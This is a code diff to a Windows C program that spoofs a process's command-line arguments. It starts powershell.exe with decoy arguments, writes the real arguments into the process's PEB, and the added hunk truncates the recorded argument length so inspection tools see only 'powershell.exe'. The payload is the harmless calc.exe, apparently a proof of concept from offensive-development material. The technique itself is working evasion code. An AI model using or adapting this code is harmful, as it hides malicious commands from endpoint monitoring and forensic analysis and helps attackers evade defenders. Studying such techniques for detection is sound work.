@@ -6,8 +6,9 @@
 #pragma warning (disable:4996)
 
 
-#define STARTUP_ARGUMENTS		L"powershell.exe Not An Evil Argument"
-#define REAL_ARGUMENTS			L"powershell.exe -c calc.exe"
+#define STARTUP_ARGUMENTS			L"powershell.exe Not An Evil Argument"
+#define REAL_ARGUMENTS				L"powershell.exe -NoExit calc.exe"
+#define SIZE_EXPOSED_FROM_PAYLOAD	sizeof(L"powershell.exe")
 
 
 typedef NTSTATUS(NTAPI* fnNtQueryInformationProcess) (
@@ -178,6 +179,15 @@ BOOL CreateArgSpoofedProcess(IN LPWSTR szStartupArgs, IN LPWSTR szRealArgs,
 	wprintf(L"\t[i] Writing \"%s\" as the process argument at: 0x%p...", szRealArgs, pParms->CommandLine.Buffer);
 	if (!WriteToTargetProcess(Pi.hProcess, (PVOID)pParms->CommandLine.Buffer, (PVOID)szRealArgs, (DWORD)(lstrlenW(szRealArgs) * sizeof(WCHAR) + 1))) {
 		wprintf(L"\t[!] Failed To Write The Real Parameters\n");
+		return FALSE;
+	}
+	wprintf(L"[+] DONE!\n");
+
+	// Runtime spoofing: to cutoff from "powershell.exe -NoExit calc.exe ument" to "powershell.exe"
+	DWORD dwNewLen = SIZE_EXPOSED_FROM_PAYLOAD;
+	wprintf(L"\n\t[i] Updating the length of the process argument from %d to %d...", pParms->CommandLine.Length, dwNewLen);
+	if (!WriteToTargetProcess(Pi.hProcess, ((PBYTE)pPeb->ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length)), (PVOID)&dwNewLen, sizeof(DWORD))) {
+		wprintf(L"\t[!] Failed to write the real parameters\n");
 		return FALSE;
 	}
 	wprintf(L"[+] DONE!\n");
